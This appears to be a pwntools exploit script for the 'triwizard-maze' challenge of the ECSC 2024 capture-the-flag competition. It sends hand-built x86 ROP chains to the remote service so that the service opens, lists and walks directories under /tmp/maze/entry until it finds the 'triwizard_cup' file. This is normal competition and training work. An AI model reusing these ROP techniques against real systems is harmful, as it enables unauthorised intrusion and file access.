#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host=triwizard-maze.challs.external.open.ecsc2024.it' '--port=38202' triwizard-maze
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'triwizard-maze')
context.arch = 'i386'
context.kernel = 'amd64'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'triwizard-maze.challs.external.open.ecsc2024.it'
port = int(args.PORT or 38202)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
set follow-fork-mode parent
b *0x13371F82
b *0x13371f47
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x13370000)

MAX_BRANCH = 12 # take a look at the magestic find-max-branch.sh script
RECV_DIRNAME_BUF_SIZE = 128

main = 0x13371F86
read_buf = 0x13371f47
filename_buf = 0x13375D60
dirent = 0x13375000 # need to be aligned
sys_read = 0x133723AF
sys_openat = 0x133725d0
sys_write = 0x133723C9
sys_call = 0x1337233E
sys_close = 0x133723E3
root_dir = b"/tmp/maze/entry"
target = b"triwizard_cup"
dfd = 1

def find(children, filename):
    global dfd
    rop = ROP(exe)

    for child in children:
        log.info(f"Searching in {child}")

        if child == filename:
            log.success("Found flag file")
            break
            # return
            # TODO: read and print flag

        rop.call(sys_read, [0, filename_buf, 100]) # zero out memory
        rop.call(sys_read, [0, filename_buf, len(child)])

        if child == root_dir:
            rop.call(sys_openat, [constants.AT_FDCWD, filename_buf, constants.O_RDONLY, 0])
        else:
            rop.call(sys_openat, [dfd, filename_buf, constants.O_RDONLY, 0])   

        dfd += 1

        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore .
        # rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0]) # ignore ..

        for i in range(MAX_BRANCH):
            rop.call(sys_call, [0x59, dfd, dirent, 0, 0, 0])
            rop.call(sys_write, [1, dirent, RECV_DIRNAME_BUF_SIZE])

        rop.raw(p32(read_buf))

        payload = rop.chain()

        # payload += p32(read_buf)
        # TODO: close syscall of dir

        assert(len(payload) < 1025)
        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
        io.send(b"\x00" * 100) # zero out the memory of the filename so we don't have to handle null terminated strings here
        io.send(child)
        # io.send(b"\x00" * 100 * MAX_BRANCH)

        entries = set()
        for i in range(MAX_BRANCH):
            data = io.recv(RECV_DIRNAME_BUF_SIZE)
            name_len= data[8]
            name_start = 10
            name_end = name_start + name_len
            entries.add(data[name_start:name_end])

        entries.pop()
        entries.remove(b".")
        entries.remove(b"..")

        print(f"{entries=}")
        if entries:
            find(entries, target)

        rop = ROP(exe)
        rop.call(sys_close, [dfd])
        rop.raw(p32(read_buf))
        payload = rop.chain()
        io.sendafter(b"Give me your x86 32bit ROP chain (exactly 1024 bytes):\n", payload.ljust(1024))
        dfd -= 1

io = start()

parent = set()
parent.add(root_dir)
print(parent)
find(parent, target)

io.interactive()

